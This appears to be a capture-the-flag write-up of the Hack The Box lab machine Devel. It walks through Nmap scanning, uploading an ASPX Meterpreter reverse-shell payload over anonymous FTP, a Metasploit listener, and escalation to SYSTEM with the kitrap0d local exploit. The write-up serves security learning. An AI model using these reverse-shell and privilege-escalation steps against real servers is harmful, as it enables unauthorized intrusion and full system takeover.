---
title: "Devel"
---

# Hack The Box - Devel

![Cap dashboard screenshot](devel.png)

**Devel** is an easy-rated Windows machine on Hack The Box that shows why exposing FTP alongside a web server can be dangerous. The path to compromise starts with anonymous FTP access, leads to a writable web root, and ends with a straightforward privilege escalation to SYSTEM. In this write-up, I’ll go through the enumeration, initial access, and local privilege escalation steps.

## Enumeration

I started with a full Nmap scan to identify open ports:

```bash
sudo nmap -p- 10.10.10.5 -T4 --min-rate 1750 -vv
```

The initial scan showed ports 21 and 80 open.

I then ran a more detailed scan against those ports:

```bash
sudo nmap -p 21,80 -sC -sV 10.10.10.5 -T4 -vv --min-rate 1750
```

### Nmap Results

```text
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The scan confirmed anonymous FTP access and showed that the HTTP server is Microsoft IIS 7.5. Since the FTP root appears to line up with the web root, I suspected I could upload files and access them through the browser.

## File Upload

To verify that theory, I created a simple text file and uploaded it to FTP:

```bash
echo "pwned" > pwned.txt
ftp 10.10.10.5
put pwned.txt
```

After uploading, I browsed to the file through the web server:

```text
http://10.10.10.5/pwned.txt
```

The content was visible in the browser, confirming that I had a writable web root through FTP.

## Initial Access

Since file upload was possible, I needed a web shell. The next step was deciding between ASP and ASPX payloads. ASP uses VBScript, while ASPX uses C#, and ASPX is usually the better choice on IIS.

I generated both payload types and chose ASPX for execution.

After creating the payload, I set up a listener:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 8443
run
```

Then I uploaded the shell and triggered it:

```text
http://10.10.10.5/shell.aspx
```

That gave me a Meterpreter session on the target.

## Post-Exploitation

Once inside, I checked my privileges:

```bash
whoami /priv
```

The output showed `SeImpersonatePrivilege`, which is useful for local privilege escalation. I also checked the system for installed patches:

```bash
systeminfo
```

There were no hotfixes installed, which made escalation easier.

## Privilege Escalation

I ran exploit suggester and found a suitable local exploit. The first relevant module was:

```text
exploit/windows/local/ms10_015_kitrap0d
```

I used it against the active session:

```bash
use exploit/windows/local/ms10_015_kitrap0d
set LHOST tun0
set SESSION 1
run
```

This elevated the session to `NT AUTHORITY\SYSTEM`.

## Attack Path

- Scan the host with Nmap.
- Identify FTP and HTTP services.
- Confirm anonymous FTP access.
- Test whether FTP and the web root are shared.
- Upload a test file and verify web access.
- Generate an ASPX payload.
- Set up a reverse shell listener.
- Upload and execute the payload.
- Gain a Meterpreter shell.
- Check privileges and patch level.
- Use a local privilege escalation exploit.
- Obtain SYSTEM access.
